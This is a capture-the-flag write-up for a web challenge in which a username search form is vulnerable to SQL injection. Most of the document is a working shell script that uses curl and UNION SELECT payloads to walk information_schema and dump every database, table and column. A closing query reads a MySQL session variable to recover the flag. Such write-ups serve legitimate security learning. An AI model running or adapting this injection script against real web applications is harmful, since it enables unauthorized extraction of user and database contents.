# Super duper advanced attack

```
Can you find the flag?

http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000

Hint
You don't need to search for the flag outside the DB, there is more than tables and columns in a DB. 
```

It's a web application with a form that lets us search for users by their username. It seems to be using MySQL's `LIKE` feature, as it returns a user even when you only search for a substring of their name. The server is down as I'm writing this, so I don't have a minimal payload exmaple, sorry.

I wrote a script to dump the whole db, column-by column, using UNION queries on information_schema:


```
#!/bin/sh

URL='http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000/'

query() {
	curl --silent --data-urlencode "username=blah%' union select 1337, $3 from $1.$2 where $4 and $5 like '%$6" "$URL"  
}

scrape() {
	grep -A 1 --no-group-separator '<td>' |
	grep -v '<td>' |
	grep -v 1337 |
	sed 's/^[[:space:]]*//'
}

query_dbs() {
	query information_schema schemata schema_name '1=1' schema_name 
}

query_tables() {
	query information_schema tables table_name '1=1' table_schema "$1" 
}

query_columns() {
	query information_schema columns column_name "table_schema='$1'" table_name "$2" 
}

query_values() {
	query "$1" "$2" "$3" '1=1' "$3" 
}

query_expression() {
	query information_schema schemata "$1" '1=1' schema_name information_schema
}

query_dbs | scrape |
while read db
do
	query_tables "$db" | scrape | 
	while read table
	do
		query_columns "$db" "$table" | scrape |
		while read column
		do
			echo "$db" "$table" "$column"
			query_values "$db" "$table" "$column" | scrape
			echo
		done
	done
done
```

However, the flag wasn't in there!!! wtf? A lot of other people were having trouble with this, too. Eventually, however, I tried this:

```
$ query_expression @flag | scrape
EKO{do_not_forget_session_variables}
```
